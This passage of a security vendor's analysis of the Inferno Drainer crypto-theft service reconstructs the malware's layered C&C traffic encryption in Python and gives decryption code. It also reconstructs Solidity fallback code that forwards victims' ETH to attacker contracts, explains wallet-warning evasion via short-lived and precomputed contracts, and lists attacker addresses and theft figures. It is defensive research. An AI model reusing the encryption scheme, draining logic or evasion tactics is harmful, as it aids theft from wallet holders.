​    random_token = getRandomString**(**len**(**str**(**random1**)))**

​    data_transformed = str**(**5 * **(**random1 - random2**))**

​    \# Encrypting Inferno Drainer customer ID

​    customer_id_encrypted = cryptojs_aes_encrypt**(**config_object**[**'customer_id'**]**, data_transformed**)**

​    combined_key = str**(**timestamp_7**)** + "inferno" + str**(**rand_str_hashed**)** + str**(**random1**)**

​    key_hash = get_short_hash**(**combined_key**)**

​    \# Layer 1:

​    payload_layer1 = cryptojs_aes_encrypt**(**payload_data, combined_key**)**

​    outer_key = str**((**random1 + random2 + timestamp_7**)** - 50**)**

​    \# Layer 2:

​    payload_layer_1_encrypted = cryptojs_aes_encrypt**(**str**(**payload_layer1**)**, outer_key**)**

​    p1 = **(**2 * **(**random1 + get_short_hash**(**str**(**payload_layer1**))** - random2**))** - 100

​    p2 = get_short_hash**(**config_object**[**'customer_id'**])** + timestamp_7

​    payload_layer_2 = **{**

​        's1': random1,

​        's2': random2,

​        'rs2': random_token,

​        't': timestamp_7,

​        'rs': rand_str_base64,

​        'd': payload_layer_1_encrypted,  # main payload

​        'k': key_hash,

​        'c': customer_id_encrypted,  # Inferno Drainer customer ID

​        'p1': p1,

​        'p2': p2,

​        'n': message_count

​    **}**

​    message_count += 1

​    payload_layer_2_str = json.dumps**(**payload_layer_2**)**

​    hash_outer = get_short_hash**(**payload_layer_2_str**)**

​    key_hash = btoa**(**str**(**hash_outer**))**

​    \# additional data encoding

​    data_transformed_hex = inferno_encode**(**json.dumps**(**payload_layer_2**))**

​    random_token_reversed = random_token**[**::-1**]**

​    p3 = get_short_hash**(**random_token_reversed**)**

​    random2_new = 5 * message_count

​    payload_layer_3 = json.dumps**({**

​        'h': key_hash,

​        'c': data_transformed_hex,

​        'p3': p3,

​        'p4': random2_new,

​        'u': '7.19'  # Inferno Drainer version?

​    **}**, separators=**(**',', ':'**))**

​    \# JS getYear(), getMonth(), getDay())

​    now = datetime.now**()**

​    js_year = now.year - 1900

​    js_month = now.month - 1

​    js_day = **(**now.weekday**()** + 1**)** % 7

​    final_key = f"{js_year}-{js_month}-{js_day}"

​    \# Layer 3 encryption:

​    payload_layer_3_encrypted = cryptojs_aes_encrypt**(**payload_layer_3, final_key**)**

​    payload_layer_4 = **{**

​        random_str_25: payload_layer_3_encrypted,

​        'v': 4  # protocol version?

​    **}**

​    \# Layer 4 encryption:

​    **return** cryptojs_aes_encrypt**(**json.dumps**(**payload_layer_4**)**, 'inferno'**)**

To analyze the intercepted traffic, it’s essential to implement the inverse logic i.e. the decryption algorithm. Next, we’ll demonstrate a simplified version of the decryption algorithm in Python, enabling researchers and security analysts to decode intercepted payloads and identify data transmitted to the attackers’ servers.

**def** inferno_decode**(**encrypted**)**:

​    **return** ''.join**(**chr**(**b ^ 3**)** **for** b **in** bytes.fromhex**(**encrypted**))**

**def** decrypt_body**(**encrypted_request, date_key**)**:

​    decrypted_request = cryptojs_aes_decrypt**(**encrypted_request, 'inferno'**)**

​    payload_layer_4 = json.loads**(**decrypted_request**)**

​    **for** key **in** final_obj:

​        **if** key != "v":

​            payload_layer_3_encrypted = payload_layer_4**[**key**]**

​            **break**

​    **else**:

​        **raise** ValueError**(**"No payload found"**)**

​    js_year = date_key.year - 1900

​    js_month = date_key.month - 1

​    js_day = **(**date_key.weekday**()** + 1**)** % 7

​    final_key = f"{js_year}-{js_month}-{js_day}"

​    payload_layer_2_str = cryptojs_aes_decrypt**(**payload_layer_3_encrypted, final_key**)**

​    payload_layer_2 = json.loads**(**payload_layer_2_str**)**

​    outer_obj_str = inferno_decode**(**payload_layer_2**[**'c'**])**

​    outer_obj = json.loads**(**outer_obj_str**)**

​    outer_key = str**((**outer_obj**[**'s1'**]** + outer_obj**[**'s2'**]** + outer_obj**[**'t'**])** - 50**)**

​    customer_id_key = str**(**5 * **(**outer_obj**[**'s1'**]** - outer_obj**[**'s2'**]))**

​    customer_id = cryptojs_aes_decrypt**(**outer_obj**[**'c'**]**, customer_id_key**)**

​    payload_data_encrypted = cryptojs_aes_decrypt**(**outer_obj**[**'d'**]**, outer_key**)**

​    rand_str_original = base64.b64decode**(**outer_obj**[**'rs'**])**.decode**()**

​    rand_str_hashed = get_short_hash**(**rand_str_original**)**

​    combined_key = str**(**outer_obj**[**'t'**])** + "inferno" + str**(**rand_str_hashed**)** + str**(**outer_obj**[**'s1'**])**

​    original_payload = cryptojs_aes_decrypt**(**payload_data_encrypted, combined_key**)**

​    **return** original_payload, customer_id

The following Python code provides a CryptoJS-compatible AES decryption function, allowing researchers to recover the original payloads:

**import** hashlib

**from** Crypto.Cipher **import** AES

**def** evp_bytes_to_key**(**password: bytes, salt: bytes, key_len: int, iv_len: int**)**:

​    dtot = b""

​    prev = b""

​    **while** len**(**dtot**)** **<** **(**key_len + iv_len**)**:

​        prev = hashlib.md5**(**prev + password + salt**)**.digest**()**

​        dtot += prev

​    **return** dtot**[**:key_len**]**, dtot**[**key_len:key_len + iv_len**]**

**def** cryptojs_aes_decrypt**(**ciphertext_b64, passphrase**)**:

​    ciphertext = base64.b64decode**(**ciphertext_b64**)**

​    **if** ciphertext.startswith**(**b"Salted__"**)**:

​        salt = ciphertext**[**8:16**]**

​        ciphertext = ciphertext**[**16:**]**

​        key, iv = evp_bytes_to_key**(**passphrase.encode**(**'utf-8'**)**, salt, 32, 16**)**

​    **else**:

​        key = passphrase.encode**(**'utf-8'**)**

​        iv = b'\\x00' * 16

​    cipher = AES.new**(**key, AES.MODE_CBC, iv**)**

​    decrypted = cipher.decrypt**(**ciphertext**)**

​    pad_len = decrypted**[**-1**]**

​    **return** decrypted**[**:-pad_len**]**.decode**(**'utf-8'**)**

Using such a complex data packaging scheme with multi-layer encryption and a variety of keys appears to be designed to prevent data spoofing, thereby safeguarding the attackers’ infrastructure.

**Server Response and Decryption**

In response to a client request, the server transmits its configuration along with asset data collected from the backend. Unlike the client request, the server’s response is encrypted in only two layers, making the decryption process considerably easier:

- **Layer 1:** The initial layer is decrypted using the static key `"inferno"`. The result is interpreted as a base64-encoded string, which is then decoded.
- **Layer 2:** Using the current date, the decryption script iterates over possible keys in the format `<year>-<month>-<day_of_week>`. In this process, adjacent values (+1, -1) for the year, month, and the day_of_the week are also tried. For each key candidate, the script attempts to decrypt the data and parse it as a JSON object. This approach ensures robustness against minor time discrepancies between the client and server, preventing decryption failures caused by time zone differences or slight clock mismatches.

Below is a simplified Python code snippet for decrypting the server response using the date as a key.

**def** decrypt_response**(**encrypted_response, datetime_now**)**:

​    \# First layer decryption with static key "inferno"

​    first_layer = cryptojs_aes_decrypt**(**encrypted_response, "inferno"**)**

​    decoded_first_layer = base64.b64decode**(**first_layer**)**.decode**(**'utf-8'**)**

​    \# Second layer decryption using a date-based key

​    **for** delta_year **in** **[**-1, 0, 1**]**:

​        **for** delta_month **in** **[**-1, 0, 1**]**:

​            **for** delta_day **in** **[**-1, 0, 1**]**:

​                test_date = date_key + relativedelta**(**years=delta_year, months=delta_month, days=delta_day**)**

​                key = f"{test_date.year - 1900}-{test_date.month - 1}-{(test_date.weekday() + 1) % 7}"

​                **try**:

​                    decrypted_data = cryptojs_aes_decrypt**(**decoded_first_layer, key**)**

​                    print**(**key**)**

​                    **return** json.loads**(**decrypted_data**)**

​                **except** Exception:

​                    **continue**  # Try next key variation

​    **return** **None**

By decrypting the server response, we gain access to the core configuration of the drainer. This includes the smart contract addresses involved in the attack, as well as the beneficiary addresses—the customer’s wallet address for a specific phishing resource and the drainer administrators’ address, which accumulates the majority of the stolen funds before redistribution.

Below is an example of a partial decrypted configuration retrieved from the Inferno Drainer C&C server:

**{**

​    **"drainerAddress":** "0x0000db5c8b030ae20308ac975898e09741e70000"**,**

​    **"customerAddress":** "0x1e54a3c6ea5b0cf6780e4270397209049af9e9f8"**,**

​    **"adminsNonSplittedHitsAddress":** "0x705aab0a328d21034cecc2c9eba842ccf7d02ba4"**,**

​    **"transferContracts":** **{**

​        **"1":** "0x000037bb05b2cef17c6469f4bcdb198826ce0000"**,**

​        **"25":** "0x000037bb05b2cef17c6469f4bcdb198826ce0000"**,**

​        ...

​    **}****,**

​    **"multiFunctionsContracts":** **{**

​        **"1":** "0x000061cf8922f785d356f046b10b11431be60000"**,**

​        **"25":** "0xcf6478b4b5e5a9f03d3e183f7a21c44b21f18669"**,**

​        ...

​    **}****,**

​    **"multiFunctionsContractBytecodes":** **{**

​        **"1":** "0x608060405234801561001057600080fd5b50604051610a1a380380610a1a83398181016040528101..."**,**

​        ...

​    **}****,**

​    **"factoryContracts":** **{**

​        **"1":** "0xed0e416e0feea5b484ba5c95d375545ac2b60572"**,**

​        **"25":** "0x343d61b74aa40fa17bc056feaf1726cb4f55d74d"**,**

​        ...

​    **}**

**}**

Below is a detailed explanation of the configuration fields referenced in the decrypted response:

- **multiFunctionsContracts** – These are the smart contracts that directly interact with the victim’s wallet. They typically disguise themselves as legitimate ERC-20 tokens with randomized names, but they contain hidden malicious logic. Throughout this article, we refer to these smart contracts as “Fake Token Contracts.”
- **transferContracts** – These are smart contracts used to accumulate stolen funds in native cryptocurrency. The first of these contracts was deployed on September 9, 2023, and has been used by Inferno Drainer ever since. On the Ethereum network, the contract is publicly verified under the name “Receiver.” In this article, we also refer to it as the Receiver contract.
- **factoryContracts** – These are smart contracts used to deploy single-use contracts. The purpose of these contracts is described in detail in the section “**Draining Tokens.**”
- **drainerAddress** – The address that acts as the owner of both Fake Token Contracts and Receiver contracts. This address has the authority to trigger transactions that drain tokens from these smart contracts.
- **customerAddress** – The address belonging to an Inferno Drainer customer (likely corresponding to a Customer ID). This is where the stolen funds are sent after deducting Inferno Drainer’s commission.

In the next section, we take a closer look at how the smart contracts referenced in the Inferno Drainer configuration are used, explore how they interact with each other, and provide real transaction examples that resulted in fund theft.

## Smart Contract Interaction to Steal Crypto

Before diving into the details of how these malicious smart contracts function and interact, we must highlight one crucial point.

Wallets such as MetaMask implement their own anti-phishing mechanism. Before approving a signature, these wallets check whether the destination address is blacklisted. If the target address is flagged as malicious, the wallet application typically either blocks the transaction or displays a prominent warning to the user:

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-10-%E2%80%93-Screenshot-showing-MetaMasks-warning-when-attempting-to-interact-with-a-known-phishing-address-521x1024.png)

**Figure 10** – Screenshot showing MetaMask’s warning when attempting to interact with a known phishing address.

In the following subsections, we demonstrate how Inferno Drainer circumvents these protections by utilizing short-lived intermediate smart contracts.

We use addresses and transaction examples from the Ethereum network. However, it is important to note that Inferno Drainer operates across multiple EVM-compatible networks, where smart contract addresses may vary. A comprehensive list of addresses for different networks can be found in the appendix.

### **Stealing Native Crypto**

The crypto drainer leverages an advanced smart contract-based scheme to steal crypto from victims’ wallets. We explain the attack flow to steal native tokens (e.g., Ethereum, BNB), the smart contracts involved, and how the stolen funds are accumulated.

The contracts involved are:

1. **Fake Token Contract** — Mimics a legitimate ERC-20 token.
2. **StorageContract** — Serves as a configuration storage, determines the route for stolen tokens.
3. **Receiver** — The final destination for stolen funds.

[![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-11-%E2%80%93-Draining-native-crypto-flow-1024x371.png)](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-11-–-Draining-native-crypto-flow.png)

**Figure 11** – Draining native crypto flow.

**Fake Token Contract**

As shown earlier, the attack begins with the victim landing on a phishing site that closely mimics the legitimate Collab.Land interface. The fake site prompts the user to connect their cryptocurrency wallet, impersonating the Collab.Land authentication flow.

When the victim connects their wallet, they are prompted to sign a transaction. The target address for this transaction is one of **intermediate smart contracts,** designed to mimic a legitimate ERC-20 token contract.

These contracts are short-lived, typically used for less than 24 hours before being abandoned. At the time of this writing, there were [**more than 500 contracts on Ethereum**](https://etherscan.io/find-similar-contracts?a=0x00002687313C403c002143b6c9A521c39EEf0000&mt=1&m=exact&ps=100&p=1) with the same bytecode.

This strategy is deliberately employed to bypass anti-phishing measures; for example, cryptocurrency wallets like MetaMask quickly flag addresses associated with phishing attempts. By frequently deploying new contracts, attackers evade these warnings, making the scam more effective.

Examples of fake token contracts:

- **0x00002687313C403c002143b6c9A521c39EEf0000**
- **0x0000b87BFDcfe20c5505bDeCF4163F5039170000**
- **0x000005317901B39666019Ff09903fF0baE440000**
- **0x000009a2bA41d34555deC617190e4Ad59e210000**
- **0x000061cf8922f785d356f046b10b11431be60000**

The contracts implement public methods typically seen in legitimate tokens, such as:

**function** totalSupply**(****)** **public** view returns **(**uint256**)**;

**function** transferFrom**(**address sender, address recipient, uint256 amount**)** **public** returns **(**bool**)**;

**function** approve**(**address spender, uint256 amount**)** **public** returns **(**bool**)**;

**function** balanceOf**(**address account**)** **public** view returns **(**uint256**)**;

**function** symbol**(****)** **public** view returns **(**string memory**)**;

**function** transfer**(**address recipient, uint256 amount**)** **public** returns **(**bool**)**;

At first glance, these contracts appear harmless and exhibit typical ERC-20 functionality. However, the malicious behavior is hidden in how they handle undefined function selectors.

**Anomalous Usage Patterns**

If we examine the interaction patterns with these contracts on blockchain explorers like Etherscan, most transactions involve calls to **undefined methods**, such as:

- **Verify (selector 0x143087ee)** — Used in attacks impersonating Collab.Land, targeting Discord users.
- **Claim (selector 0x3158952e)** — Likely used in airdrop scams, tricking users into thinking they are claiming free tokens.

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-12-%E2%80%93-Calling-undefined-methods-Claim-and-Verify-on-the-fake-token-contract-1024x121.png)

**Figure 12** – Calling undefined methods “Claim” and “Verify” on the fake token contract.

Any call that does not match a known function selector (e.g., Verify(), Claim()) or is just a raw transfer of ETH, triggers the fallback logic. The approximate reconstructed code for this behavior:

fallback**(****)** external payable **{** 

​    // 1) Load list of owners from an external "StorageContract"

​    address**[****]** memory owners = storage.getOwners**(****)**;

​        

​    bool isOwner = **false**;

​    **for** **(**uint i = 0; i < owners.length; i++**)** **{**

​        **if** **(**owners**[**i**]** == msg.sender**)** **{**

​            isOwner = **true**;

​            **break**;

​        **}**

​    **}**

​        

​    // 2) If not an owner, drain msg.value

​    **if** **(**!isOwner**)** **{**

​        address receiver = storage.nativeCryptoReceiver**(****)**;

​        // Forwards all ETH / native token

​        **(**bool success, **)** = payable**(**receiver**)**.call**{**value: msg.value**}****(**""**)**;

​    **}** **else** **{**

​        // If owner, do delegate call ...

​    **}**

**}**

Therefore, when the **Verify()** or **Claim()** method is called (or any undefined method), the fake token contract calls **StorageContract** to:

- **getOwners()**: Retrieve an array of addresses authorized as owners (attacker addresses).
- **nativeCryptoReceiver()**: Retrieve the address where stolen funds should be forwarded.

If a potential victim’s address is not in that owners array, the contract essentially drains all ETH attached to that call into the attacker’s Receiver contract ([transaction trace](https://app.dedaub.com/ethereum/tx/0x74399c282443b400e66df56aaa529efca38c168d7ebd73037c90df63d85a0e54)):

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-13-%E2%80%93-FakeToken.Verify-transaction-trace.png)

**Figure 13** – FakeToken.Verify() transaction trace.

Otherwise, if the caller’s address is on the owner list, a different logic is executed via a delegatecall to the smart contract at **0x0B7A19c3d261dcEeb6ed3b2023B07b6cc4E60543**, which implements the multicall function. The purpose of this function is described later.

**StorageContract**

Unlike the fake token contract, **StorageContract** is unique and has the address:

- [0x0000E23aBdC862a1911d77904e77Fdb378D00000](https://etherscan.io/address/0x0000E23aBdC862a1911d77904e77Fdb378D00000)

The contract serves a single purpose: it stores the address of the Receiver contract as well as the list of owner addresses used in the logic of both the fake ERC‑20 contract and the Receiver contract. StorageContract allows adding and removing owners, and owners can change the Receiver contract address. However, both the owner addresses and the Receiver contract address were set once at the time of deployment and remain unchanged ever since. The owner’s address is currently set to:

- **0x0000db5c8B030ae20308ac975898E09741e70000**

### Receiver

The **Receiver** contract serves as the accumulator for funds drained from the victims. It accumulates native cryptocurrency via its payable fallback and receive functions. Only addresses listed in the StorageContract (as determined by the onlyOwner modifier) can trigger withdrawals, ensuring that only the Inferno Drainer owners can later move the stolen funds to their own or customers’ wallets.

The contract provides both single and batch withdrawal functions.

In all observed attacks, the same Receiver contract address was used:

- [0x000037bB05B2CeF17c6469f4BcDb198826Ce0000](https://etherscan.io/address/0x000037bb05b2cef17c6469f4bcdb198826ce0000#code)

By checking the blockchain explorer, we can see that the contracts StorageContract and Receiver were deployed on September 9, 2023, and have been used in Inferno Drainer campaigns for more than a year.

### Draining Tokens

**Using Approve and Intermediate (fake token) Contract**

To steal tokens, Inferno Drainer, like other drainers (e.g., MS Drainer), uses a more sophisticated scheme based on delegating the right to withdraw tokens from the victim’s wallet to another wallet or smart contract. In this case, this right is delegated to the smart contract of a fake token (described earlier). Most often, this is done using the standard approve function in ERC-20 and similar token standards on EVM-compatible networks, after which the attackers can call the **transferFrom** function to transfer tokens from the victim’s address to their own addresses.

In some cases, the victim may be tricked into making a direct transfer to the fake token’s address using the transfer function (assuming the transaction is signed by the wallet owner, who is unaware of its true purpose). However, the main scheme usually revolves around the approve mechanism followed by transferFrom.

After the malicious contract (fake token) receives approval to manage the victim’s tokens, a transaction is sent on behalf of the owner of this malicious contract. This transaction calls the multicall method, implemented in a separate smart contract at 0x0B7A19c3d261dcEeb6ed3b2023B07b6cc4E60543 (as mentioned earlier). This allows several operations to be combined into one transaction, immediately distributing the stolen funds to multiple addresses:

- The address of a customer of Inferno Drainer.
- Addresses belonging to Inferno Drainer operators, who receive a “commission” (typically 15–20% of the stolen amount).

Based on transaction monitoring, we observed that the Inferno Drainer cashout addresses currently rotate approximately every 1–2 months. Below are the most recent addresses used in these schemes:

| **Address**                                    | **First Seen** | **Last Seen** |
| ---------------------------------------------- | -------------- | ------------- |
| **0x66bc4b94a47fb1c7f8a3252ca01f66917d2414a1** | 2025-03-01     | *Active*      |
| **0x1fe92e288b2b2792bcdee8b8f286e0ed16724da6** | 2025-01-26     | *Active*      |
| **0x9872c6ec4d63dda94ed6c4cd873e88a643adb433** | 2025-01-06     | 2025-03-16    |
| **0x4df845dfebbb2815cd026586e883147152025a99** | 2024-12-24     | 2025-01-29    |
| **0x5400f716f97a294b75c5db0c37d432231485e426** | 2024-12-11     | 2025-01-06    |
| **0x077db731adafa3200f18543d5ed62768ad66846a** | 2024-12-04     | 2025-01-05    |
| **0xa86c343c0b30d994d16967b72b9e9235e534497b** | 2024-11-19     | 2024-12-28    |
| **0x2b022b3dff934b9ff5a82ed949970b129ec555fc** | 2024-10-19     | 2024-12-03    |

A noticeable change in tactics occurred in late 2024. Prior to this, cashout addresses were used for much longer periods, in some cases exceeding a year. These are some of the previously used addresses:

| **Address**                                    | **First Seen** | **Last Seen** |
| ---------------------------------------------- | -------------- | ------------- |
| **0xab4db125e41bbe6175f1d516d922733263cbf2ec** | 2023-12-04     | 2024-10-30    |
| **0xaa862f977d6916a1e89e856fc11fd99a2f2fabf8** | 2024-08-21     | 2024-10-24    |
| **0xfc4eaa4ac84d00f1c5854113581f881b42b4a745** | 2024-03-23     | 2024-10-23    |
| **0x53d0e4dab3e125dd25ecfb24ca610075fa9bc8e1** | 2023-10-05     | 2024-10-22    |
| **0xf672775e124e66f8cc3fb584ed739120d32bbaad** | 2024-02-22     | 2024-10-22    |
| **0x29488e5fd6bf9b3cc98a9d06a25204947cccbe4d** | 2023-02-03     | 2024-10-22    |

We see that all previously used addresses stopped receiving stolen funds in October 2024, marking a transition to a new tactic: using addresses with a shorter lifespan and more frequent rotations. This change likely aims to evade detection and blacklisting by blockchain security firms and law enforcement. More frequent wallet rotations reduce the risk of their assets being frozen and make tracking transactions harder.

Fifteen to 20 percent of the stolen tokens are kept by the Inferno Drainer group as a commission, while the rest is transferred to the customer.

An [example](https://app.dedaub.com/ethereum/tx/0x2e122bed57044a997bd710b25bb58310a124bd10941e881a88393d62e7e1540d?line=1,0,1) of such a transaction is provided below:

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-14-%E2%80%93-Trace-of-the-transaction-that-is-stealing-ERC-20-tokens-1024x393.png)

**Figure 14** – Trace of the transaction that is stealing ERC-20 tokens.

**Using Permit2**

Another option that attackers can use is the permit function (available in some token standards). Permit allows the owner to sign an offline message and grant approval to spend tokens without a separate on-chain transaction. If the victim does not have enough native tokens to pay the gas fee for a regular approve transaction, the attackers can use permit to gain access to the funds without requiring gas payment.

Below is an [example](https://app.dedaub.com/ethereum/tx/0xb07988d29fafb6062816ec13e506f805a0ec1085295861d290cf5c6168768834?vmstep_start=0) of a real transaction in which this mechanism was used:

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-15-%E2%80%93-Trace-of-the-transaction-that-is-stealling-ERC-20-tokens-using-Permit2-1024x319.png)

**Figure 15** – Trace of the transaction that is stealing ERC-20 tokens (using Permit2).

**Transferring Tokens to a Precomputed Contract Address Prior to Its Deployment**

In some cases, the drainer also employs another rather sophisticated technique. The funds are sent from the victim’s wallet to a single-use smart contract. However, the key aspect of this attack is that at the moment of the transfer, the smart contract has not yet been deployed on the network.

First, the drainer pre-calculates the future address of the contract using Ethereum’s deterministic address generation mechanism. Next, it initiates the transfer from the victim’s wallet to this precomputed address. After the victim signs the transaction, the drainer deploys the smart contract at the precomputed address. In the same deployment transaction, the contract automatically forwards the received tokens splitting them to the customer’s and Inferno Drainer’s operators’ wallets, just as in the previous scheme. A special **factoryContract** is used to deploy the one-time smart contract. We mentioned **factoryContract** previously when we analyzed the drainer’s configuration. On the Ethereum network, it is located at address:

- **0xed0e416e0fEEA5b484ba5c95d375545AC2b60572**

Below is an example of such transaction:

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-16-%E2%80%93-Trace-of-the-first-transaction-transferring-tokens-from-the-victims-wallet-to-the-pre-calculated-address-of-an-undeployed-smart-contract-1024x339.png)

**Figure 16** – [Trace of the first transaction](https://app.dedaub.com/ethereum/tx/0xc40b22621c343ac8a5efaa9847c2d8eb62847f2e6169f131ddba3f09518a982c), transferring tokens from the victim’s wallet to the pre-calculated address of an undeployed smart contract.

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-17-%E2%80%93-Trace-of-the-second-transaction-deploying-the-smart-contract-and-forwarding-the-tokens-to-the-attackers-wallets-1024x545.png)

**Figure 17** – Trace of the [second transaction](https://app.dedaub.com/ethereum/tx/0x983c889cc9e39f5de2dc0325fbd50cd6520f739a1bff8b916449c64450bbcc86), deploying the smart contract and forwarding the tokens to the attackers’ wallets.

This one-time-use contract is discarded immediately after its purpose is fulfilled. Naturally, before deployment, its address cannot be included in any anti-phishing databases, meaning the wallet cannot flag or block the transfer as suspicious. Furthermore, even if the address is later blacklisted, it has no effect on the attackers, as the smart contract already completed its function and is no longer in use.

## Operational Scale and Financial Impact of Inferno Drainer

Inferno Drainer operates across more than 30 EVM-compatible networks. However, its most significant impact was observed on the most popular blockchains, particularly Ethereum and Binance Smart Chain. Through an in-depth analysis of active campaigns, we identified a set of blockchain addresses associated with Inferno Drainer and its customers. By tracking malicious transactions across just a few blockchains, we compiled a concerning set of statistics.

Between September 2024 and March 2025, we identified:

- Over 30,000 new victims (unique wallet addresses).
- 1190 addresses suspected to be linked to Inferno Drainer customers.

While the majority of malicious transactions resulted in only relatively small losses, some victims suffered substantial losses, with amounts reaching hundreds of thousands of dollars. Below are some of the largest transactions linked to Inferno Drainer’s campaigns:

| **Date**   | **Token** | **Token Price (USD)** | **Amount**      | **USD Equivalent** | **Transaction Hash**                                         |
| ---------- | --------- | --------------------- | --------------- | ------------------ | ------------------------------------------------------------ |
| 2024-09-24 | ETH       | 1,928                 | 33.50535572     | $64,598            | 0x808d9a95ead8c572c0fa712d68f8f2304745d233881fe2761658ddf3be89b3db |
| 2024-10-01 | ENA       | 0.3724                | 500,346         | $186,321           | 0x598e022e221288e8f7837e5ffdde30c3a0e502600859a1401b0eb46c14e45b3b |
| 2024-10-09 | USDC      | 1                     | 54,138          | $54,138            | 0x48814377bfc3e5f76283b3cd3b166442328972a8f6f9074b8d6b9693ce25c40a |
| 2024-10-11 | DAI       | 1                     | 60,915          | $60,915            | 0x5cd1eeee1b091888e7b19bc25c99a44a08e80112fdc7a60a88b11ed592483a5f |
| 2024-10-13 | PEPE      | 0.00000706            | 107,800,000,000 | $761,068           | 0xd330ff045ba48d8f1b783542083f64736fd90af08b82a99eef9019afd677f0df |
| 2024-10-21 | USDT      | 1                     | 162,248         | $162,248           | 0xbf7f719c4f18ae3189ea0e614ff2d288fa2546fb6ad95d30931952ca36a9b5b6 |
| 2024-11-15 | USDT      | 1                     | 220,000         | $220,000           | 0x983c889cc9e39f5de2dc0325fbd50cd6520f739a1bff8b916449c64450bbcc86 |
| 2024-11-16 | FET       | 0.5185                | 262,731         | $136,223           | 0xe037210026110b2f629196b4b165d38f0cc476c3645260185d83805c2715ab4e |
| 2024-12-06 | USDC      | 1                     | 61,138          | $61,138            | 0xfaa4ace41b901a62d115a3553656dca5972aaf617780a279783d6d3a8a8a8673 |
| 2024-12-11 | USDC      | 1                     | 75,875          | $75,875            | 0x0fafcc38e9cb73f43d09de310ed06b154c4373843a104e2f5725bebf737e1b7d |
| 2024-12-20 | FLOKI     | 0.0000618             | 1,202,452,547   | $74,311            | 0xad49c25a5d7155c926a673c458b13ef2d76caa51a58a327e0060e5ea4e2ff3ad |
| 2024-12-27 | LINK      | 14.0087               | 3,387           | $47,453            | 0x3e8e6f90b4194423879603aa757454bd627c597980807dd7999ba0cafebf311b |
| 2025-01-27 | USDC      | 1                     | 70,747          | $70,747            | 0x02da9274972a489ec7e38c639c01ad57623a0405729fdabb3c6d3932397713a3 |
| 2025-01-29 | LINK      | 14.0087               | 16,939          | $237,297           | 0xc34310a3c33f26b4449dea3c30e51b1a7164726498c3262777bfea5b2d4a1557 |
| 2025-02-22 | USDC      | 1                     | 65,056          | $65,056            | 0xb9b8fe1f1a9f90e472241906813b9b7fd8f862b0b3ea33148ab4d6567218eb5f |
| 2025-03-07 | USDC      | 1                     | 80,000          | $80,000            | 0xff653849ff06a050346604413c79ff5242467f732c582159a22fd8df67b8d3a6 |

The largest transaction listed above occurred on October 13, 2024, involving the theft of 107,800,000,000 PEPE tokens. Even at current market prices, this amounts to $761,068. At the time of the theft, however, these tokens were valued at [over $1.2 million](https://x.com/PeckShieldAlert/status/1845645941531189619).

By analyzing transactions involving fungible tokens from the Top-100 CoinMarketCap list and native coins such as ETH, BNB, FTM, and AVAX, we estimate that during the last six months Inferno Drainer has stolen at least $9,000,000 based on today’s market prices.

![img](https://research.checkpoint.com/wp-content/uploads/2025/04/Figure-18-%E2%80%93-Total-stolen-funds-in-Millions-of-USD-over-time-1024x534.png)

**Figure 18** – Total stolen funds (in millions of USD) over time.

It is important to note that not all stolen tokens have real market value. To ensure accuracy, our evaluation only includes high-liquidity assets that can be easily converted into USD at current exchange rates. In addition, we did not include multiple blockchain networks where significant thefts may also have occurred. Additionally, our calculations exclude various asset types supported by Inferno Drainer, such as liquidity pool (LP) tokens and other specialized crypto assets, due to difficulties in accurately estimating their value. Therefore, depending on the valuation methods and the scope of assets considered, the total estimated stolen funds may vary significantly. Regardless, the losses amount to millions of dollars.

It should be noted that, according to Inferno Drainer’s creators themselves, by May 2024, their drainer was responsible for stealing over $250 million throughout its entire operational history.

## Conclusion

Over the past decade, the cyber criminal landscape has undergone a profound transformation. In the past, malware campaigns could be orchestrated by a single developer or a small group of attackers. Today’s operations, particularly in the Web3 space, require deep, cross-disciplinary expertise and coordination. The rising complexity of security mechanisms and blockchain technologies has led to the emergence of full-fledged underground ecosystems, operating much like legitimate tech startups.

Services like Inferno Drainer require the combined expertise typically seen in legitimate development teams, including frontend and backend engineers, smart contract developers, DevOps, and specialists in security and evasion techniques. This industrialization of cyber crime, combined with a service-based model (Drainer-as-a-Service), allows for continuous evolution, scalability, and global reach.

Despite widespread awareness of crypto scams, continuous improvements in wallet security, and growing efforts by browser vendors and security solutions to prevent phishing, attackers consistently manage to stay one step ahead.

In this report, we explore the sophisticated technical methods employed by Inferno Drainer and its customers to evade detection. These methods include complex smart contract interactions, rapid rotation of short-lived malicious contracts, protection of centralized infrastructure via proxies, retrieving C&C server addresses from blockchain smart contracts, multi-layer encryption of stored data, using short-lived domains for phishing websites, utilizing disposable security tokens, applying extensive multi-layered encryption and network traffic obfuscation, as well as employing multi-level obfuscation of the client-side JavaScript code executed in victims’ browsers. These techniques make automated and manual analysis — and even simple identification of phishing resources — extremely challenging for cybersecurity teams.

Combined with targeted deception and effective social engineering tactics, these techniques enable attackers to successfully conduct their activities, as evidenced by the stable financial flow identified through blockchain transaction analysis.

To minimize the risk of becoming a victim of such attacks, follow these recommendations:

- Carefully verify the addresses and domains of websites to which you connect your cryptocurrency wallets. Use browser bookmarks and avoid clicking on links from nontrusted sources.
- Exercise caution when interacting with Discord bots. Always ensure official bots have a “**Verified App**” status.
- Avoid rushing through wallet transactions and take extra time to confirm details. Never sign transactions or messages whose purpose you don’t fully understand. If an action raises doubts, refuse to sign it.
- Use a separate wallet (a so-called “burner wallet”) when participating in token airdrops, testing new or lesser-known projects, or interacting with websites you don’t fully trust. Never keep significant cryptocurrency balances in such wallets.
- Monitor official project resources and community channels regularly to stay informed about potential attacks and recommended security measures.

## Protection

Check Point customers remain protected against the threat described in this research by Check Point’s security solutions, including [Quantum Gateway](https://www.checkpoint.com/quantum/), [Harmony Endpoint](https://www.checkpoint.com/harmony/endpoint/), and [Harmony Browse](https://www.checkpoint.com/harmony/advanced-endpoint-protection/browser-security/). Protection names:

- *Inferno.TC.**
- *Trojan.UNKNOWN.InfernoDrainer.A*

The Threat Intel Blockchain system developed by Check Point continues to accumulate valuable information on emerging threats, and this intelligence will be shared in the future. In this collaborative effort, we aim to empower investors with the knowledge needed to, navigate the crypto space securely and protect themselves from potential pitfalls. For more information contact us at: [blockchain@checkpoint.com](mailto:blockchain@checkpoint.com)

## **Indicators of Compromise**

